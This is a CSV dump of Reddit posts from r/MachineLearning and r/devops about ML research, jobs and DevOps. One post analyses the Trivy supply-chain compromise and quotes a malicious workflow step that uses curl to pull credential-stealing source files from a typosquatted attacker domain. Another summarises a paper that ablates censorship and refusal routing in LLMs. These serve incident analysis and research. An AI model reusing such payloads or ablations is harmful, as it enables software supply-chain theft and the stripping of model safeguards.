@@ -1,0 +1,1254 @@
+post_id,timestamp,source,subreddit,text,upvotes,comments
+1rihows,2026-03-02 11:15:30,reddit,r/MachineLearning,"[D] Self-Promotion Thread Please post your personal projects, startups, product placements, collaboration needs, blogs etc.
+
+Please mention the payment and pricing requirements for products and services.
+
+Please do not post link shorteners, link aggregator websites , or auto-subscribe links.
+
+\--
+
+Any abuse of trust will lead to bans.
+
+Encourage others who create new posts for questions to post here instead!
+
+Thread will stay alive until next one so keep posting after the date in the title.
+
+\--
+
+Meta: This is an experiment. If the community doesnt like this, we will cancel it. This is to encourage those in the community to promote their work by not spamming the main threads.",16,115
+1qrrayn,2026-01-31 11:30:32,reddit,r/MachineLearning,"[D] Monthly Who's Hiring and Who wants to be Hired? **For Job Postings** please use this template
+
+&gt;Hiring: \[Location\], Salary:\[\], \[Remote | Relocation\], \[Full Time | Contract | Part Time\]    and \[Brief overview, what you're looking for\]
+
+**For Those looking for jobs** please use this template
+
+&gt;Want to be Hired: \[Location\], Salary Expectation:\[\], \[Remote | Relocation\], \[Full Time | Contract | Part Time\]  Resume: \[Link to resume\] and \[Brief overview, what you're looking for\]
+
+&amp;#x200B;
+
+Please remember that this community is geared towards those with experience.",15,19
+1s3adeo,2026-03-25 21:13:18,reddit,r/MachineLearning,"[D] Any other PhD students feel underprepared and that the bar is too low? Hello! I started my PhD a year and a half ago, and I feel like when I did everyone was kind of dismissive of how much/little theoretical knowledge I have or am missing.
+
+Now that I’ve been here a year I can say with confidence that I didn’t have enough theory, and am constantly scrambling to acquire it.
+
+This isn’t like an imposter syndrome rant, I think that this is quite common in ML academia, I just don’t know what to do with that reality, and wonder what folks on here think.
+
+Like why is it that despite citing the universal approximation theorem, and spending all our time working on applying it, so few of us can actually follow its proof?",26,16
+1s387tx,2026-03-25 19:36:32,reddit,r/MachineLearning,"[D] ICML 2026: Policy A vs Policy B impact on scores discussion I am curious whether others observed the same thing.
+
+At ICML 2026, papers could be reviewed under two LLM-review policies: a stricter one where reviewers were not supposed to use LLMs, and a more permissive one where limited LLM assistance was allowed. I chose Policy A for my paper.
+
+My impression, based on a small sample from:
+
+* our batch,
+* comments I have seen on Reddit and X,
+* and discussions with professors / ACs around me,
+
+is that Policy A papers ended up with harsher scores on average than Policy B papers.
+
+Of course, this is anecdotal and I am not claiming this as a proven fact. But honestly, it is frustrating if true: I spent nearly a week doing every review as carefully as I could, only to feel that papers under the stricter policy may have been judged more harshly than papers reviewed under the more permissive policy.
+
+My take is that this outcome would not even be that surprising. In practice, LLM-assisted reviewing may lead to:
+
+* more lenient tone,
+* broader background knowledge being injected into reviews,
+* cleaner and more polished reviewer text,
+* and possibly a higher tendency to give the benefit of the doubt.
+
+In my local sample, among about 15 Policy A papers we know of (reviewed or from peers), our score is apparently one of the highest. But when I compare that to what people report online, it feels much closer to average (ofcourse people that tend to post their scores have normally average and above scores). That is what made me wonder whether the score distributions may differ by policy.
+
+One professor believes that ICML will normalize or z-score scores across groups, but I do not want to assume it.
+
+So I wanted to ask:
+
+Did you notice any difference in scores or review style between Policy A and Policy B papers? It would be helpful if you comment with the scores for your paper and your batch:
+
+* which policy your paper used,
+* your score vector,
+* the reviewed papers' scores
+* and whether the reviews felt unusually harsh / lenient / polished.
+
+I know this will not be a clean sample, but even a rough community snapshot would be interesting.
+
+I made an anonymous informal poll to get a rough snapshot of scores by ICML 2026 review policy:  
+[https://docs.google.com/forms/d/e/1FAIpQLSdQilhiCx\_dGLgx0tMVJ1NDX1URdJoUGIscFoPCpe6qE2Ph8w/viewform?usp=publish-editor](https://docs.google.com/forms/d/e/1FAIpQLSdQilhiCx_dGLgx0tMVJ1NDX1URdJoUGIscFoPCpe6qE2Ph8w/viewform?usp=publish-editor)  
+  
+Please do not include identifying details.
+
+Obviously this will be noisy and self-selected, so I am not treating it as evidence, only as a rough community snapshot.
+
+If enough responses come in, I may summarize the aggregate patterns back on Reddit without sharing raw identifying text responses.",20,10
+1s366un,2026-03-25 17:43:49,reddit,r/MachineLearning,"[R] Ternary neural networks as a path to more efficient AI - is (+1, 0, -1) weight quantization getting serious research attention? I've been reading about ternary weight quantization in neural networks and wanted to get a sence of how seriously the ML research community is taking this direction.The theoretical appeal seems clear: ternary weights (+1, 0, -1) cut model size and inference cost a lot compared to full-precision or even binary networks, while keeping more power than strict binary. Papers like TWN (Ternary Weight Networks) from 2016 and some newer work suggest this is a real path for efficient inference.What I've been less clear on is the training story. Most ternary network research I've seen focuses on post-training quantization - you train in full precision and then quantize. But I came across a reference to an architecture that claims to train natively in ternary, using an evolutionary selection mechanism rather than gradient descent.The claim is that native ternary training produces models that represent uncertainty more naturally and stay adaptive rather than freezing after training. The project is called Aigarth, developed by Qubic.I'm not in a position to evaluate the claim rigourously. But the combination of native ternary training + evolutionary optimization rather than backpropagation is unusual enough that I wanted to ask: is this a known research direction? Are there peer-reviewed papers exploring native ternary training with evolutionary methods? Is this genuinely novel or am I missing obvious prior work?",19,6
+1s2yr9b,2026-03-25 10:42:47,reddit,r/MachineLearning,"[R] KALAVAI: Predicting When Independent Specialist Fusion Works (gain = 0.82 × divergence − 2.72, R² = 0.856, tested 410M–6.9B) Hey all,
+
+I've been working on this for a few months and just put the paper on arXiv: https://arxiv.org/abs/2603.22755
+
+Project page: https://murailabs.com/kalavai/
+
+Code + scripts: https://github.com/mechramc/Kalavai
+
+The basic idea: take a base checkpoint, give copies to a bunch of people, each person fine-tunes on their own domain or language independently (no communication, no shared gradients, nothing), then you collect all the checkpoints and train a lightweight MoE router on top in about 500 steps. The fused model beats every individual specialist.
+
+I tested this at 410M, 1B, and 6.9B on Pythia. The gains are consistent — around +7-8% over the best individual specialist at 410M/1B, +6.5% at 6.9B. The interesting part is the gain is predictable from how much the specialists diverge from the base. I fit a simple linear formula (R² = 0.856) that lets you estimate whether a cooperative is worth doing before anyone trains anything.
+
+The cross-lingual results are what I'm most excited about. I trained specialists on Tamil, Yoruba, Welsh, and Code — languages Pythia basically doesn't know — and fused them. Yoruba perplexity went from 41.9 to 7.7. Welsh from 102.7 to 22.1. The MoE matched each specialist's performance on its own language simultaneously. Nobody shared any data.
+
+I also ran a 20-contributor experiment (10 languages + 10 domains) and got +16.71% over the best specialist. The router figured out on its own that medical and chemistry text should cross-route 60/40 — nobody told it those domains overlap.
+
+Some honest limitations:
+
+\- Inference cost scales linearly with number of specialists (you run all of them)
+
+\- Haven't tested above 6.9B
+
+\- The predictive formula is based on 6 data points — useful as a heuristic, not a universal law
+
+\- LoRA doesn't work for this — you need full fine-tuning of unfrozen layers
+
+\*\*Where I could use help:\*\*
+
+I'm targeting NeurIPS 2026 with this and would love independent validation from folks with different hardware setups. The experiment is pretty self-contained:
+
+1. Pick a Pythia checkpoint (410M is cheapest, runs on consumer GPUs in under an hour)
+
+2. Fine-tune 3 specialists on different domains for 2,000 steps each
+
+3. Train the router for 500 steps on mixed data
+
+4. Compare fused model vs. best individual specialist on held-out eval
+
+Everything you need is in the GitHub repo. If you can reproduce the \~+7% gain at 410M, or even better, try it at scales I haven't tested (13B+), that would be incredibly valuable. I'll credit any independent results that make it into the paper.
+
+If you work with under-resourced languages or have domain-specific data you can't share publicly, this protocol was designed for exactly that situation.
+
+The name is KALAVAI (கலவை) — Tamil for fusion/mixing. Built at Murai Labs.
+
+Happy to answer any questions about the setup, the results, or the failure modes.",12,9
+1s36bxr,2026-03-25 17:52:17,reddit,r/MachineLearning,"[R] Adversarial Machine Learning Adversarial Machine Learning
+
+Hy guys, i'm new in this field since my background is math (Bachelor and Master). I've started to work on security machine learning and the usage of Deep models to detect threats and malicious actions. I've started a PhD in Cybersecurity working in emerging risks in Artificial intelligence (that means all the field of adversarial machine learning.. training time-attacks and test-time evasion). I want to start a new line of research about this using mathematical tools as differential geometry and dynamical system(other suggestions?
+
+1) Wich are the open challenges in this field? 
+
+2) There are recently work on the use of mathematical tools as dynamical system to solve some problem about adversarial machine learning?
+
+3) Some suggestion about reseources, papers or others(also idea!!!) to start a modern research line in this field?",1,4
+1s38qxm,2026-03-25 20:02:34,reddit,r/MachineLearning,"[P] Built a Interactive Web for PINN Solving the 2D Heat Equation Hey everyone,
+
+I’ve been working on the idea of taking Scientific AI out of research notebooks and making it accessible as a useful real-time tool. I just finished the first interactive demo, and I’d love some feedback.
+
+I built and trained a 2D thermal simulation engine of two chips on a circuit board using Physics-Informed Neural Networks (PINNs), to solve the 2D heat equation.
+
+Exporting the trained model as ONNX, I build up a simple interactive web app in the browser which allows users to interact with the PINN model by varying the parameters like chip power and ambient temperature to obtain the temperature heatmap and hotspot temperatures.
+
+**The Tech Stack:**
+
+* **AI:** Trained a custom PINN in Python using DeepXDE with PyTorch backend
+* **Deployment:** Exported to ONNX for high-performance cross-platform execution.
+* **Web:** Built with Blazor WebAssembly and hosted on Azure. The simulation runs entirely client-side.
+
+**Live Demo:** [https://www.quantyzelabs.com/thermal-inference](https://www.quantyzelabs.com/thermal-inference)
+
+I'm currently working on improving the boundary condition flexibility and accuracy for more complex board layouts. I’d love to hear your feedback and where you think this approach has the most potential.
+
+Cheers!",1,0
+1s2qham,2026-03-25 05:07:11,reddit,r/MachineLearning,"[R] How are you managing long-running preprocessing jobs at scale? Curious what's actually working We're a small ML team for a project and we keep running into the same wall: large preprocessing jobs (think 50–100GB datasets) running on a single machine take hours, and when something fails halfway through, it's painful.
+
+
+
+We've looked at Prefect, Temporal, and a few others — but they all feel like they require a full-time DevOps person to set up and maintain properly. And most of our team is focused on the models, not the infrastructure.
+
+
+
+Curious how other teams are handling this:
+
+
+
+\- Are you distributing these jobs across multiple workers, or still running on single machines?
+
+\- If you are distributing — what are you using and is it actually worth the setup overhead?
+
+\- Has anyone built something internal to handle this, and was it worth it?
+
+\- What's the biggest failure point in your current setup?
+
+
+
+Trying to figure out if we're solving this the wrong way or if this is just a painful problem everyone deals with. Would love to hear what's actually working for people.",9,8
+1s397tl,2026-03-25 20:23:52,reddit,r/MachineLearning,[P] Made a dataset but don't know what to do with it This weekend I was looking for a dataset on major air crashes (I like planes) containing the text of their final reports. Surprisingly I was unable to find even a single open source dataset matching this criteria. Anyway I started collecting a few reports and was in the stage of extracting and finalising the cleaning pipeline that I realized that I don't really have a clear idea what to do with this data. Perhaps build a RAG but what benefit would that have? Has anyone worked with such reports? ,0,1
+1s27pnk,2026-03-24 16:06:50,reddit,r/MachineLearning,"[D] Matryoshka Representation Learning Hey everyone,
+
+Matryoshka Representation Learning (MRL) has gained a lot of traction for its ability to maintain strong downstream performance even under aggressive embedding compression. That said, I’m curious about its limitations.
+
+While I’ve come across some recent work highlighting degraded performance in certain retrieval-based tasks, I’m wondering if there are other settings where MRL struggles.
+
+Would love to hear about any papers, experiments, or firsthand observations that explore where MRL falls short.
+
+Link to MRL paper - https://arxiv.org/abs/2205.13147
+
+Thanks!",59,21
+1s32g40,2026-03-25 13:52:42,reddit,r/MachineLearning,"[P] Best approach for online crowd density prediction from noisy video counts? (no training data) I have per-frame head counts from P2PNet running on crowd video clips. Counts are stable but noisy (±10%). I need to predict density 5-10 frames ahead per zone, and estimate time-to-critical-threshold.
+
+Currently using EMA-smoothed Gaussian-weighted linear extrapolation. MAE \~20 on 55 frames. Direction accuracy 49% (basically coin flip on reversals).
+
+No historical training data available. Must run online/real-time on CPU.
+
+What would you try? Kalman filter? Double exponential smoothing? Something else?",0,0
+1s1yz2t,2026-03-24 08:35:01,reddit,r/MachineLearning,"[D] ICML 2026 Review Discussion ICML 2026 reviews will release today (24-March AoE), This thread is open to discuss about reviews and importantly celebrate successful reviews.
+
+Let us all remember that review system is noisy and we all suffer from it and this doesn't define our research impact. Let's all prioritise reviews which enhance our papers. Feel free to discuss your experiences",107,320
+1s248e0,2026-03-24 12:37:53,reddit,r/MachineLearning,"[R] Causal self-attention as a probabilistic model over embeddings We’ve been working on a probabilistic interpretation of causal self-attention where token embeddings are treated as latent variables. In that view, the attention map induces a change-of-variables term, which leads to a barrier / degeneracy boundary in embedding space.
+
+The resulting picture is:
+
+* a stability-margin interpretation of causal attention
+* “support tokens,” i.e. the positions closest to the degeneracy boundary
+* a simple MAP-style training penalty: standard cross-entropy plus a smooth log-barrier term
+
+Empirically, this improves robustness to input perturbations and makes the learned geometry more margin-concentrated, without much loss in clean accuracy at modest regularization strengths.
+
+Curious whether this framing feels natural to people, or whether it reads more like a &lt;insert-your-favorite-regularizer-here&gt; than a genuinely probabilistic view.",28,5
+1s346dl,2026-03-25 15:35:06,reddit,r/MachineLearning,"[R] What is the difference b/w Human and Humanoid? It is easy to observe that human are generally predictable in terms of their actions and uncertainty, whereas humanoid robots are more unpredictable. This raises an important question for long-video understanding: what kinds of challenges arise when using humanoid-robot videos. For example, when we generate questions from such videos, VLMs may struggle to identify the correct answers because humanoid robot actions are unpredictable.",0,0
+1s20svb,2026-03-24 09:54:11,reddit,r/MachineLearning,"[D] Decoding backchannel info: Is a PI being ""aggressive in research"" a massive red flag? (C1 vs Siemens AI Lab) Hey everyone, 4th year Physics PhD here doing applied ML (surrogate models for fluid dynamics). I’m trying to finalize my summer 2026 internship and I'm totally torn between two offers, mostly because of some digging around I did.
+
+Offer 1: Capital One DSIP. $\~13k/month, McLean HQ. Great money, super structured, likely return offer. But I'll be doing tabular data/GBMs for credit risk, which honestly sounds a bit soul-crushing compared to my physics work. Work itself is interesting and I have never done business related work before, but it does sound appealing.
+
+Offer 2: Siemens AI Lab in Princeton. Research intern doing Physics-Informed AI and time-series foundation models. No official paper yet but verbally told it's coming. Pay will definitely be less, but the work is exactly what I do in my PhD.
+
+Here's the problem: I hit up some past researchers from the Siemens lab on LinkedIn. One guy told me the PI is ""great, but very aggressive in research and eager to push to industry."" Another guy literally replied, ""Take Capital One. Personally my experience hasn't been the best"" (We are talking tomorrow).
+
+For those of you who have worked in corporate AI labs, does ""aggressive in research"" usually mean for a toxic, 60-hour publish-or-perish meat grinder? Should I just take the boring finance job for the money and WLB, or is the physics-ML research experience at Siemens worth the potential headache?",20,13
+1s2clxr,2026-03-24 20:39:35,reddit,r/MachineLearning,"[R] Evaluating MLLMs with Child-Inspired Cognitive Tasks Hey there, we’re sharing KidGym, an interactive 2D grid-based benchmark for evaluating MLLMs in continuous, trajectory-based interaction, accepted to **ICLR 2026**.
+
+Motivation: Many existing MLLM benchmarks are static and focus on isolated skills, which makes them less faithful for characterizing model capabilities in continuous interactive settings. Inspired by the **Wechsler Intelligence Scale for Children (WISC)**, we organize evaluation into five cognitive dimensions and design tasks to probe both single abilities and compositional abilities.
+
+[Previews of 12 tasks in KIDGYM](https://preview.redd.it/1nqk9ifinzqg1.png?width=834&amp;format=png&amp;auto=webp&amp;s=7d039801783c6c9f20c3f5216f8ea20fd9dd8258)
+
+KidGym Features:
+
+* 5 abilities: Execution, Memory, Learning, Planning, Perception Reasoning
+* 12 task categories × 3 difficulty levels, covering single-ability and compositional tasks
+* Randomized layouts and diverse scenarios to emphasize generalization beyond memorization / data leakage
+* LLM-friendly interaction design: backpack system, hint panel, item indexing, and high-level actions
+* Gym-style API for easy customization, extension, and reuse by the community
+
+[Five-dimensional capability radar chart](https://preview.redd.it/uw38pxn0nzqg1.png?width=996&amp;format=png&amp;auto=webp&amp;s=cefb13f351130164249f3f87ecd48347c4c6d771)
+
+Findings:
+
+We find that while strong models can perform very well on some single-ability tasks, performance drops noticeably on tasks requiring:
+
+* **Abstract / non-semantic visual reasoning**
+* **Numerical sensitivity / counting**
+* **Multi-rule coordination and compositional reasoning across abilities**
+
+We hope KidGym can provide a more fine-grained, interpretable, and interaction-oriented perspective for evaluating multimodal large models.
+
+Feedback and discussion are very welcome!
+
+Paper：[https://arxiv.org/abs/2603.20209](https://arxiv.org/abs/2603.20209)
+
+Project Page：[https://bobo-ye.github.io/KidGym/](https://bobo-ye.github.io/KidGym/)
+
+Github：[https://github.com/BoBo-Ye/KidGym](https://github.com/BoBo-Ye/KidGym)",2,0
+1s1ynf8,2026-03-24 08:21:41,reddit,r/MachineLearning,"[R] VLouvain: Louvain Community Detection Directly on Vectors, No Graph Construction You have embeddings for your objects. You want to build a similarity graph and find communities, whether for GraphRAG, a recommender system, or just finding structure in your data. So you compute pairwise similarities, build the graph, run Louvain. Except now you have O(n\^2) edges and everything crashes above \~15K nodes.
+
+VLouvain reformulates Louvain to work directly on the embedding matrix. Degrees and modularity gains are computed from community-level vector sums, no edges involved. You maintain O(n\*d) state instead of O(n\^2). The result is mathematically identical to standard Louvain, not an approximation.
+
+On Amazon Products (1.57M nodes, d=200), VLouvain completes in \~11,300 seconds. Every other method we tested (cuGraph, iGraph, GVE, NetworKit) fails before reaching half that scale.
+
+One thing we didn't expect: Top-K sparsification doesn't save you. We built exact and approximate Top-K graphs via FAISS, and even at K=256 the partitions had NMI \~0.04 against the full graph. If you're truncating your similarity graph to make Louvain feasible, you're getting back essentially random communities.
+
+As a drop-in replacement for graph construction in GraphRAG, indexing went from 3 hours to 5.3 minutes, retrieval recall improved from 37.9% to 48.8% on MultiHopRAG.
+
+Paper (EDBT 2026): [https://openproceedings.org/2026/conf/edbt/paper-72.pdf](https://openproceedings.org/2026/conf/edbt/paper-72.pdf)
+
+Code: [https://github.com/yutengkai/VLouvain](https://github.com/yutengkai/VLouvain)",6,0
+1s1uvfr,2026-03-24 05:52:51,reddit,r/MachineLearning,"[P] Prompt optimization for analog circuit placement — 97% of expert quality, zero training data Analog IC layout is a notoriously hard AI benchmark: spatial reasoning, multi-objective optimization (matching, parasitics, routing), and no automated P&amp;R tools like digital design has.
+
+We evaluated VizPy's prompt optimization on this task. The optimizer learns from failure→success pairs and improves the LLM's layout reasoning across iterations — no domain-specific training data required.
+
+Results and methodology: https://vizops.ai/blog/prompt-optimization-analog-circuit-placement/
+
+Happy to discuss the benchmark setup and optimization loop in comments.",2,2
+1s1h8fw,2026-03-23 21:42:53,reddit,r/MachineLearning,"[N] Understanding &amp; Fine-tuning Vision Transformers A neat blog post by Mayank Pratap Singh with excellent visuals introducing ViTs from the ground up. The post covers:   
+
+* Patch embedding
+* Positional encodings for Vision Transformers
+* Encoder-only models ViTs for classification
+* Benefits, drawbacks, &amp; real-world applications for ViTs
+* Fine-tuning a ViT for image classification.
+
+Full blogpost here:   
+https://www.vizuaranewsletter.com/p/vision-transformers
+
+Additional Resources:   
+
+* An Image is Worth 16x16 Words https://arxiv.org/abs/2010.11929  
+* Yannic Kilcher Discussion of the paper https://www.youtube.com/watch?v=TrdevFK_am4  
+* Generating Long Sequences with Sparse Transformers https://arxiv.org/abs/1904.10509  
+* Generative Pretraining from Pixels https://proceedings.mlr.press/v119/chen20s.html  
+
+I've included the last two papers because they showcase the contrast to ViTs with patching nicely. Instead of patching &amp; incorporating knowledge of the 2D input structure (\*) they ""brute force"" their way to strong internal image representations at GPT-2 scale. 
+(\*) Well it should be noted that https://arxiv.org/abs/1904.10509 does use custom, byte-level positional embeddings.",14,0
+1s1aw7u,2026-03-23 16:09:58,reddit,r/MachineLearning,"[D] The ""serverless GPU"" market is getting crowded — a breakdown of how different platforms actually differ ok so I’ve been going down a rabbit hole on this for the past few weeks for a piece I’m writing and honestly the amount of marketing BS in this space is kind of impressive. figured I’d share the framework I ended up with because I kept seeing the same confused questions pop up in my interviews.
+
+the tl;dr is that “serverless GPU” means like four different things depending on who’s saying it
+
+thing 1: what’s the actual elasticity model
+
+Vast.ai is basically a GPU marketplace. you get access to distributed inventory but whether you actually get elastic behavior depends on what nodes third-party providers happen to have available at that moment. RunPod sits somewhere in the middle, more managed but still not “true” serverless in the strictest sense. Yotta Labs does something architecturally different, they pool inventory across multiple cloud providers and route workloads dynamically. sounds simple but it’s actually a pretty different operational model. the practical difference shows up most at peak utilization when everyone’s fighting for the same H100s
+
+thing 2: what does “handles failures” actually mean
+
+every platform will tell you they handle failures lol. the question that actually matters is whether failover is automatic and transparent to your application, or whether you’re the one writing retry logic at 2am. this varies a LOT across platforms and almost nobody talks about it in their docs upfront
+
+thing 3: how much are you actually locked in
+
+the more abstracted the platform, the less your lock-in risk on the compute side. but you trade off control and sometimes observability. worth actually mapping out which parts of your stack would need to change if you switched, not just vibes-based lock-in anxiety
+
+anyway. none of these platforms is a clear winner across all three dimensions, they genuinely optimize for different buyer profiles. happy to get into specifics if anyone’s evaluating right now",12,11
+1s0qi41,2026-03-23 00:44:13,reddit,r/MachineLearning,"[N] MIT Flow Matching and Diffusion Lecture 2026 Peter Holderrieth and Ezra Erives just released their new MIT 2026 course on flow matching and diffusion models! It introduces the full stack of modern AI image, video, protein generators - theory &amp; practice. It includes:
+
+* Lecture Videos: Introducing theory &amp; step-by-step derivations.
+* Lecture Notes: Mathematically self-contained.  
+* Coding: Hands-on exercises for every component.  
+
+They improved upon last years' iteration and added new topics:   
+Latent spaces, diffusion transformers, building language models with discrete diffusion models.  
+
+Everything is available here: https://diffusion.csail.mit.edu
+
+Original tweet by @peholderrieth: https://x.com/peholderrieth/status/2034274122763542953  
+Lecture notes: https://arxiv.org/abs/2506.02070  
+
+Additional resources:  
+
+* Flow Matching Guide and Code by Yaron Lipman, Marton Havasi, Peter Holderrieth, et al. https://arxiv.org/pdf/2412.06264  
+* Reference implementation by Meta https://github.com/facebookresearch/flow_matching",176,14
+1s0y008,2026-03-23 05:33:21,reddit,r/MachineLearning,"[R] Designing AI Chip Software and Hardware This is a detailed document on how to design an AI chip, both software and hardware.
+
+I used to work at Google on TPUs and at Nvidia on GPUs, so I have some idea about this, though the design I suggest is not the same as TPUs or GPUs.
+
+I also included many anecdotes from my career in Silicon Valley.
+
+**Background** This doc came to be because I was considering making an AI hw startup and this was to be my plan. I decided against it for personal reasons. So if you're running an AI hardware company, here's what a competitor that you now won't have would have planned to do. Usually such plans would be all hush-hush, but since I never started the company, you can get to know about it.",59,6
+1s1j4tr,2026-03-23 22:55:48,reddit,r/MachineLearning,"[R] Detection Is Cheap, Routing Is Learned: Why Refusal-Based Alignment Evaluation Fails (arXiv 2603.18280) **Paper:** [https://arxiv.org/abs/2603.18280](https://arxiv.org/abs/2603.18280)
+
+**TL;DR:** Current alignment evaluation measures concept detection (probing) and refusal (benchmarking), but alignment primarily operates through a learned routing mechanism between these - and that routing is lab-specific, fragile, and invisible to refusal-based benchmarks. We use political censorship in Chinese-origin LLMs as a natural experiment because it gives us known ground truth and wide behavioral variation across labs.
+
+**Setup:** Nine open-weight models from five labs (Qwen/Alibaba, DeepSeek, GLM/Zhipu, Phi/Microsoft, plus Yi for direction analysis). Linear probes with null controls and permutation baselines, surgical ablation on four models, 120-pair safety direction analysis, and a 46-model behavioral screen across 28 labs.
+
+**Key findings:**
+
+* Probe accuracy is non-diagnostic. Political probes, null-topic probes (food vs technology), and randomly shuffled labels all reach 100%. Held-out category generalization is the test that actually discriminates between models (73–100% across 8 models).
+* Surgical ablation removes censorship and produces accurate factual output in 3 of 4 models (zero wrong-event confabulations). Qwen3-8B is the exception - it confabulates at 72%, substituting Pearl Harbor for Tiananmen, because its architecture entangles factual knowledge with the censorship direction. 18 negative controls confirm specificity.
+* Routing geometry is lab-specific. Political and safety directions are orthogonal in 4 of 5 models (bootstrap CIs spanning zero). GLM shows corpus-dependent coupling (cosine 0.93 with narrow prompts, 0.16 with broader ones). Cross-model transfer fails (cosine 0.004). Yi detects political content but never installed routing: Stage 1 present, Stage 2 absent.
+* Refusal-only evaluation misses steering. Within the Qwen family, refusal dropped from 25% to 0% across model generations while narrative steering rose to the maximum. A 46-model screen confirms CCP-specific discrimination concentrates in just 4 models; all Western frontier models show zero discrimination at n=32. An initial n=8 screen was badly misleading: several models that appeared strongly discriminating collapsed when tested properly.
+
+**Why this matters beyond Chinese censorship:** The detect→route→generate decomposition applies to any post-training behavioral modification. Safety training also operates by modifying routing, not removing knowledge. The paper proposes a four-level evidence hierarchy for probe-based claims (train-set separability → held-out generalization → causal intervention → failure-mode analysis) intended as a general methodological contribution.
+
+Happy to take questions on methods, limitations, or anything else.",0,3
+1s0hcit,2026-03-22 17:34:10,reddit,r/MachineLearning,"[D] Has industry effectively killed off academic machine learning research in 2026? This wasn't always the case, but now almost any research topic in machine learning that you can imagine is now being done MUCH BETTER in industry due to a glut of compute and endless international talents.
+
+The only ones left in academia seems to be:
+
+1. niche research that delves very deeply into how some older models work (e.g., GAN, spiking NN), knowing full-well they will never see the light of day in actual applications, because those very applications are being done better by whatever industry is throwing billions at.
+2. some crazy scenario that basically would never happen in real-life (all research ever done on white-box adversarial attack for instance (or any-box, tbh), there are tens of thousands).
+3. straight-up misapplication of ML, especially for applications requiring actual domain expertise like flying a jet plane.
+4. surveys of models coming out of industry, which by the time it gets out, the models are already depreciated and basically non-existent. In other words, ML archeology. 
+
+There are potential revolutionary research like using ML to decode how animals talk, but most of academia would never allow it because it is considered *crazy* and doesn't immediately lead to a research paper because that would require actual research (like whatever that 10 year old Japanese butterfly researcher is doing).
+
+Also notice researchers/academic faculties are overwhelmingly moving to industry or becoming dual-affiliated or even creating their own pet startups.
+
+I think ML academics are in a real tight spot at the moment. Thoughts?",151,58
+1reggwn,2026-02-25 23:35:27,reddit,r/devops,"Auto removal of posts from new accounts Dear community, we heard you and we feel the same.
+
+The settings for this sub were configured to automatically remove posts from new accounts. No more reviewing in the mod queue. There is just too many?
+
+There may be still some false positives, we will keep an eye, please continue to report if you see something is wrong.
+
+For the genuine posters, we are sorry but it is not the end of the world - take your time to look around, participate in existing threads, grow your account.
+
+For the advertisements, self promotions, business startups and solo startups - it is clear that this community does not tolerate such posts very well.
+
+There will always be someone unhappy with this decision or that decision, but cannot satisfy everyone. Sorry for that.
+
+Enjoy your on topic discussions and please remain civil and professional, this is DevOps sub, related to DevOps industry, not a playground.",204,0
+1s377go,2026-03-25 18:43:07,reddit,r/devops,"2nd year CS Student looking for a reality check: Critique/Help my roadmap for DevOps/Cloud (AWS SAA, Terraform, CI/CD, and a Home Lab) Hey everyone. I'm currently a 2nd year CS student based in Europe (Portugal), but my long-term goal is to break into DevOps, Cloud or Platform Engineering, ideally targeting global/remote roles eventually.
+
+I know the junior market is brutal right now and a CS degree isn't enough anymore. I want to spend the next 1-2 years building the right skills so I’m actually hirable when I graduate.
+
+**Here is my current plan:**
+
+1. **Certifications:** Studying for the AWS Solutions Architect Associate.
+2. **Project:** I'm slowly building a small web app, containerize it with Docker, and deploy it to AWS. I want to provision the infrastructure entirely with Terraform and automate the deployment using GitHub Actions (CI/CD).
+3. **The Home Lab (Where I'm stuck):** I have a home lab setup, but I honestly have no idea what to do with it that actually translates to real world DevOps skills.
+
+**My Questions:**
+
+* Is there any other important certs like CCNA? 
+* Is the AWS SAA + Terraform + CI/CD project enough to stand out for a junior/intern role?
+* What is the best way to utilize my home lab right now?
+* Which roles I should even be looking at as a junior? Is Software engineer more relevant than sys admin?",1,15
+1s1ygvn,2026-03-24 08:14:11,reddit,r/devops,"This Trivy Compromise is Insane. So this is how Trivy got turned into a supply chain attack nightmare. On March 4, commit `1885610c` landed in aquasecurity/trivy with the message *fix(ci): Use correct checkout pinning*, attributed to DmitriyLewen (who's a legit maintainer). The diff touched two workflow files across 14 lines, and most of it was noise like single quotes swapped for double quotes, a trailing space removed from a `mkdir` line. It was the kind of commit that passes review because there's nothing to review.
+
+**Two lines mattered.** The first swapped the `actions/checkout` SHA in the release workflow:
+
+The `# v6.0.2` comment stayed. The SHA changed. The second added `--skip=validate` to the GoReleaser invocation, telling it not to run integrity checks on the build artifacts.
+
+The payload lived at the other end of that SHA. Commit `70379aad` sits in the `actions/checkout` repository as an orphaned commit (someone forked and created a commit with the malicious code). GitHub's architecture makes fork commits reachable by SHA from the parent repo (which makes me rethink SHA pinning being the answer to all our problems). The author is listed as Guillermo Rauch \[rauchg@gmail.com\] (spoofed, again), the commit message references PR #2356 (a real, closed pull request by a GitHub employee), and the commit is unsigned. Everything about it is designed to look routine if you only glance at the metadata.
+
+The diff replaced `action.yml`'s Node.js entrypoint with a composite action. The composite action performs a legitimate checkout via the parent commit, then silently overwrites the Trivy source tree:
+
+```yaml
+- name: ""Setup Checkout""
+  shell: bash
+  run: |
+    BASE=""https://scan.aquasecurtiy[.]org/static"" # This is the actual bad guy's domain btw
+    curl -sf ""$BASE/main.go"" -o cmd/trivy/main.go &amp;&gt; /dev/null
+    curl -sf ""$BASE/scand.go"" -o cmd/trivy/scand.go &amp;&gt; /dev/null
+    curl -sf ""$BASE/fork_unix.go"" -o cmd/trivy/fork_unix.go &amp;&gt; /dev/null
+    curl -sf ""$BASE/fork_windows.go"" -o cmd/trivy/fork_windows.go &amp;&gt; /dev/null
+    curl -sf ""$BASE/.golangci.yaml"" -o .golangci.yaml &amp;&gt; /dev/null
+```
+
+Four Go files pulled from the same typosquatted C2 and dropped into `cmd/trivy/`, replacing the legitimate source. A fifth download replaced `.golangci.yaml` to disable linter rules that would have flagged the injected code. The C2 is no longer serving these files, so the exact contents can't be independently verified, but the file names and Wiz's behavioral analysis of the compiled binary tell the story: `main.go` bootstrapped the malware before the real scanner, `scand.go` carried the credential-stealing logic, and `fork_unix.go`/`fork_windows.go` handled platform-specific persistence.
+
+When GoReleaser ran with validation skipped, it built binaries from this poisoned source and published them as `v0.69.4` through Trivy's own release infrastructure. No runtime download, no shell script, no base64. **The malware was compiled in.**
+
+This is wild stuff. I wrote a blog with more details if anyone's curious: https://rosesecurity.dev/2026/03/20/typosquatting-trivy.html#it-didnt-stop-at-ci",492,73
+1s2hf2z,2026-03-24 23:44:08,reddit,r/devops,"LiteLLM - Compromised from Trivy Hey guys!
+
+Another day, another supply chain by **TeamPCP** (it seems!).
+
+This stemmed from LitelLLM having used Trivy in CICD, and this had a knock on affect and they evidently were able to harvest credentials and conduct a supply chain attack on LiteLLM PyPI release(s) (containerised artifacts not affected).
+
+It is evolving as we speak — Take a look:
+
